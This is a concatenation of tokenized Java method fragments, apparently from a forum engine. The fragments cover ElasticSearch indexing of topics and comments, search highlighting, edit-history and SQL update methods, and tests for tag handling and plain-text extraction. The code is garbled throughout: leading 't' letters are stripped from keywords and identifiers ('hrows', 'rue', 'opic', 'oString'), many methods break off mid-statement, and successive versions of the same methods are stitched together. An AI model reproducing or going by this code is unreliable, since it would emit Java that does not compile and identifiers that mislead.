public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException , SolrServerException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic opic ) hrows IOException , SolrServerException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , opic . getId ( ) ) ; doc . put ( " section_id " , opic . getSectionId ( ) ) ; doc . put ( " section " , opic . getSectionId ( ) ) ; doc . put ( " user_id " , opic . getUid ( ) ) ; doc . put ( " opic_user_id " , opic . getUid ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " group_id " , opic . getGroupId ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " section_id " , opic . getSectionId ( ) ) ; doc . put ( " section " , opic . getSectionId ( ) ) ; doc . put ( " user_id " , comment . getUserid ( ) ) ; doc . put ( " opic_user_id " , opic . getUid ( ) ) ; doc . put ( " opic_id " , comment . getTopicId ( ) ) ; doc . put ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . put ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
public void handleMessage ( UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException { logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows IOException , MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException { int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic opic ) hrows IOException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , opic . getId ( ) ) ; doc . put ( " section_id " , opic . getSectionId ( ) ) ; doc . put ( " section " , opic . getSectionId ( ) ) ; doc . put ( " user_id " , opic . getUid ( ) ) ; doc . put ( " opic_user_id " , opic . getUid ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " group_id " , opic . getGroupId ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
public Group getGroup ( Section section , String name ) hrows GroupNotFoundException { Group group = getGroupOrNull ( section , name ) ; if ( group = = null ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; hrow new GroupNotFoundException ( " group not found " ) ; } return group ; } 
public void handleMessage ( UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException { if ( ! mappingsSet ) { updateMapping ( ) ; } logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException { if ( ! mappingsSet ) { updateMapping ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void updateMessage ( Topic opic ) hrows IOException { Map < String , Object > doc = new HashMap < > ( ) ; doc . put ( " id " , opic . getId ( ) ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User opicAuthor = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , opicAuthor . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . put ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
private void updateMapping ( ) hrows IOException { logger . info ( " Updating ElasticSearch mappings " ) ; String mappingSource = IOUtils . oString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . addMapping ( MESSAGES_TYPE , mappingSource ) . execute ( ) . actionGet ( ) ; mappingsSet = rue ; } 
private void updateMessage ( Topic opic ) hrows IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , msgbaseDao . getMessageText ( opic . getId ( ) ) . getText ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private void updateMapping ( ) hrows IOException { logger . info ( " Updating ElasticSearch mappings " ) ; String mappingSource = IOUtils . oString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; if ( ! client . admin ( ) . indices ( ) . prepareExists ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) . isExists ( ) ) { client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) ; } client . admin ( ) . indices ( ) . preparePutMapping ( MESSAGES_INDEX ) . setType ( MESSAGES_TYPE ) . setSource ( mappingSource ) . execute ( ) . actionGet ( ) ; mappingsSet = rue ; } 
private String extractText ( MessageText ext ) { if ( ext . isLorcode ( ) ) { return lorCodeService . parseForOgDescription ( ext . getText ( ) ) ; 
private void updateMessage ( Topic opic ) hrows IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field itle = new HighlightBuilder . Field ( " itle " ) ; itle . numOfFragments ( 0 ) ; request . addHighlightedField ( itle ) ; HighlightBuilder . Field opicTitle = new HighlightBuilder . Field ( " opic_title " ) ; opicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( opicTitle ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
public void handleMessage ( UpdateMessage msgUpdate ) hrows MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } logger . info ( " Indexing " + msgUpdate . getMsgid ( ) ) ; reindexMessage ( msgUpdate . getMsgid ( ) , msgUpdate . isWithComments ( ) ) ; } 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private void createIndex ( ) hrows IOException { if ( ! client . admin ( ) . indices ( ) . prepareExists ( MESSAGES_INDEX ) . execute ( ) . actionGet ( ) . isExists ( ) ) { String mappingSource = IOUtils . oString ( getClass ( ) . getClassLoader ( ) . getResource ( " es-mapping.json " ) ) ; logger . info ( " Create ElasticSearch index " ) ; client . admin ( ) . indices ( ) . prepareCreate ( MESSAGES_INDEX ) . setSource ( mappingSource ) . execute ( ) . actionGet ( ) ; } mappingsSet = rue ; } 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field itle = new HighlightBuilder . Field ( " itle " ) ; itle . numOfFragments ( 0 ) ; request . addHighlightedField ( itle ) ; HighlightBuilder . Field opicTitle = new HighlightBuilder . Field ( " opic_title " ) ; opicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( opicTitle ) ; HighlightBuilder . Field message = new HighlightBuilder . Field ( " message " ) ; message . numOfFragments ( 1 ) ; message . fragmentSize ( MESSAGE_FRAGMENT ) ; request . addHighlightedField ( message ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
private void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public void deleteImage ( User editor , Image image ) { EditHistoryDto info = new EditHistoryDto ( ) ; info . setEditor ( editor . getId ( ) ) ; info . setMsgid ( image . getTopicId ( ) ) ; info . setOldimage ( image . getId ( ) ) ; info . setObjectType ( EditHistoryObjectTypeEnum . TOPIC ) ; imageDao . deleteImage ( image ) ; editHistoryService . insert ( info ) ; opicDao . updateLastmod ( image . getTopicId ( ) , false ) ; } 
public void updateLastmod ( int opicId , boolean bump ) { if ( bump ) { jdbcTemplate . update ( " UPDATE topics SET lastmod=now() WHERE id=? " , opicId ) ; 
public boolean isComment ( ) { return ! " wiki " . equals ( " section " ) & & opic ! = Integer . valueOf ( msgid ) ; } 
public void commit ( Topic msg , User commiter ) { jdbcTemplate . update ( " UPDATE topics SET moderate='t', commitby=?, commitdate=CURRENT_TIMESTAMP, lastmod=CURRENT_TIMESTAMP WHERE id=? " , 
public void publish ( Topic msg ) { jdbcTemplate . update ( " UPDATE topics SET draft='f',postdate=CURRENT_TIMESTAMP,lastmod=CURRENT_TIMESTAMP WHERE id=? AND draft " , 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , ag1Id , false ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForObject ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , Integer . class , ag1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , ag1Id , rue ) ; userTagDao . deleteTag ( user1Id , ag2Id , rue ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , ag2Id , false ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( ag2Id ) ; int result ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_IGNORE_BY_USER , Integer . class , user1Id ) ; assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForObject ( QUERY_COUNT_FAVORITE_BY_USER , Integer . class , user2Id ) ; assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
private QueryBuilder processQueryString ( Client client , String queryText ) { QueryStringQueryBuilder esQuery = queryString ( queryText ) ; esQuery . lenient ( rue ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
private QueryBuilder processQueryString ( Client client , String queryText ) { String fixedText = queryText . replaceAll ( " ((?: \\ [)|(?:])|(?:[ \\ \\ /])) " , " \\ \\ $1 " ) ; QueryStringQueryBuilder esQuery = queryString ( fixedText ) ; esQuery . lenient ( rue ) ; ValidateQueryResponse response = client . admin ( ) . indices ( ) . prepareValidateQuery ( SearchQueueListener . MESSAGES_INDEX ) . setTypes ( SearchQueueListener . MESSAGES_TYPE ) . setQuery ( esQuery ) . execute ( ) . actionGet ( ) ; if ( response . isValid ( ) ) { return esQuery ; 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( ermFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; return booster ; } 
public ModelAndView handleSectionNotFoundException ( SectionNotFoundException ex ) { return new ModelAndView ( " errors/code404 " ) ; } 
private void setupHighlight ( SearchRequestBuilder request ) { HighlightBuilder . Field itle = new HighlightBuilder . Field ( " itle " ) ; itle . numOfFragments ( 0 ) ; request . addHighlightedField ( itle ) ; HighlightBuilder . Field opicTitle = new HighlightBuilder . Field ( " opic_title " ) ; opicTitle . numOfFragments ( 0 ) ; request . addHighlightedField ( opicTitle ) ; HighlightBuilder . Field message = new HighlightBuilder . Field ( " message " ) ; message . numOfFragments ( 1 ) ; message . fragmentSize ( MESSAGE_FRAGMENT ) ; message . noMatchSize ( MESSAGE_FRAGMENT ) ; request . addHighlightedField ( message ) ; request . setHighlighterEncoder ( " html " ) ; request . setHighlighterPreTags ( " <em class=search-hl> " ) ; request . setHighlighterPostTags ( " </em> " ) ; } 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( ermFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . factorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . from ( " now-3y " ) , ScoreFunctionBuilders . factorFunction ( RECENT_BOOST ) ) ; return booster ; } 
private void updateMessage ( Topic opic ) hrows IOException { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User opicAuthor = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , opicAuthor . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . put ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . rim ( ) . oLowerCase ( ) ; if ( langHash . containsKey ( lang ) ) { ret . append ( " <div class= \" code \" ><pre class= \" " ) . append ( langHash . get ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre></div> " ) ; return ret . oString ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid+" from solr"); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private void updateMessage ( Topic opic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( opic . getTitle ( ) ) ) ; doc . put ( " opic_title " , opic . getTitle ( ) ) ; doc . put ( " message " , extractText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicDao . getTags ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private String extractText ( MessageText ext ) { if ( ext . isLorcode ( ) ) { return lorCodeService . extractPlainText ( ext . getText ( ) ) ; 
public String extractPlainText ( String ext ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , rue , false ) , ext ) . renderOg ( ) ; } 
public String extractPlainText ( String ext , int maxLength ) { String plainText = extractPlainText ( ext ) ; if ( plainText . length ( ) < maxLength ) { return plainText ; 
public boolean isEmptyTextComment ( String msg ) { return extractPlainText ( msg . rim ( ) ) . isEmpty ( ) ; } 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainText ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainText ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainText ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . extractPlainText ( " [code]&#9618;[/code] " ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . extractPlainText ( xt , 250 ) ) ; assertEquals ( 250 + 3 , 
public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . oString ( ) . rim ( ) ; } 
public String extractPlainText ( String ext , int maxLength , boolean encodeHtml ) { String plainText = extractPlainText ( ext ) ; String cut ; if ( plainText . length ( ) < maxLength ) { cut = plainText ; } else { cut = plainText . substring ( 0 , maxLength ) . rim ( ) + " ... " ; } if ( encodeHtml ) { return StringUtil . escapeForceHtml ( cut ) ; 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . extractPlainText ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . extractPlainText ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . extractPlainText ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . extractPlainText ( " [code]&#9618;[/code] " , 250 , rue ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . extractPlainText ( xt , 250 , rue ) ) ; assertEquals ( 250 + 3 , 
